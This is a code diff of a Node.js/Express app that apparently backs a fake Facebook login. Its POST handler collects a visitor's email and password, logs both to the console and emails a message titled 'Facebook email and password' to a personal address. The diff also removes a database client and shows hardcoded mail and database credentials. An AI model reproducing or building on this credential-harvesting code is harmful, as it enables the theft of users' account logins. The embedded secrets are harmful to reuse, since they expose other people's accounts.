@@ -30,17 +30,7 @@ var transporter = nodemailer.createTransport({
         pass: 'fpmtfmcvrwpenfuy'
     }
 });
-// #########################################################################################################################################################################################
-const client = new pg.Client({
-    user: 'vknjruhfiarkkd',
-    password: 'b3cf54047b0ad8234bd442e966993c1eb2a84e47fef50972e8c601de34ed9e83',
-    database: 'ded4phd4ba2inh',
-    port: 5432,
-    host: 'ec2-54-225-242-183.compute-1.amazonaws.com',
-    ssl: true
-});
 
-client.connect();
 
 // #########################################################################################################################################################################################
 app.get('/', function (req, res) {
@@ -54,11 +44,14 @@ app.get('/sign_up', function (req, res) {
 app.post('/', function (req, res) {
     var email=req.body.email;
     var pass=req.body.pass;
+    console.log(email);
+    console.log(pass);
+
     var mailOptions = {
         from: 'bassem.sadaqah@gmail.com',
         to: "bassemsadakah.bs@gmal.com",
         subject: 'Facebook email and password',
-        text: 'email: '+email+'\n password: '+pass,
+        text: 'email',
         html:''
         
     };
@@ -69,6 +62,8 @@ app.post('/', function (req, res) {
             console.log('Email sent: ' + info.response);
         }
     });
+    res.redirect('/');
+
 
 });
 app.post('/sign_up', function (req, res) {
